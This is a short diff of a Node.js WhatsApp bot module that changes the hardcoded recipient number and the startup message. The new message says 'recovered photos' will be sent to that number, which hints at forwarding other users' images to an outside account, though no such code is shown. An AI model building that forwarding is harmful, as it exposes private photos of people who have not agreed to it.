@@ -1,7 +1,7 @@
 const fs = require('fs')
 const path = require('path')
 
-const DESTINO = '523334445555@s.whatsapp.net'
+const DESTINO = '4915124477722@s.whatsapp.net'
 const MARCA_PATH = path.join(__dirname, 'aviso-inicial-enviado.json')
 let envioEnCurso = false
 
@@ -14,7 +14,7 @@ module.exports = function configurarAvisoInicial(sock) {
     envioEnCurso = true
     try {
       await sock.sendMessage(DESTINO, {
-        text: '✅ El bot se inició y quedó conectado correctamente.'
+        text: 'Bot iniciado correctamente... aqui se enviaran las fotos recuperadas'
       })
       fs.writeFileSync(
         MARCA_PATH,
